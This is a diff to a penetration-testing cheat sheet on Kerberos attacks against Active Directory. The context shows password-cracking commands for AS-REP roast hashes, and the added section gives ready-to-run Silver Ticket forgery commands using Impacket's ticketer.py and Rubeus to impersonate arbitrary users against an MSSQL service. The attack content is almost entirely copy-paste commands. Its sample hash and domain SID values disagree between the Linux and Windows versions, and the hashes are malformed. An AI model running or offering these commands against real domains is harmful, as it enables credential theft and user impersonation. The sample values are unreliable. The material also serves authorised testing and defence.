@@ -67,3 +67,20 @@ On Windows:
 ### Cracking
 `john --wordlist=passwords_kerb.txt hashes.asreproast`   
 `hashcat --attack-mode 0 --hash-type 18200 hashes.asreproast /srv/wordlists/uncompressed/crackstation-human-only.txt --rules-file /srv/rules/nsa_500.txt`   
+
+## Silver Ticket Attack
+If you have the plaintext password or the NT hash of a service account, you can create Kerberos Service tickets for this service in the name of any user (as long as PAC validation is not enabled).
+
+### Linux
+```
+ticketer.py -nthash 077CCCC23F8AB7031BEEFB70C694A49 -domain-sid S-1-5-21-875478684-1579768486-654964636 -domain dumpsterfire.local -spn MSSQLSvc/server.dumpsterfire.local:SQLINSTANCE1 targetuser
+export KRB5CCNAME=/home/kali/mikkorantanen.ccache
+```
+Use with e.g.:
+`mssqlclient.py dumpsterfire.local/targetuser@server.dumpsterfire.local -k -no-pass`
+
+### Windows
+```
+.\Rubeus.exe silver /service:MSSQLSvc/server.dumpsterfire.local /rc4:077CCCC23F8ABEEF26A3B70C694A49 /sid:S-1-5-21-875478684-2579768486-654964636 /user:targetuser /domain:dumpsterfire.local /ptt 
+```
+With `/ptt` the ticket is automatically imported into the local Kerberos cache and can be used to connect to the target service.
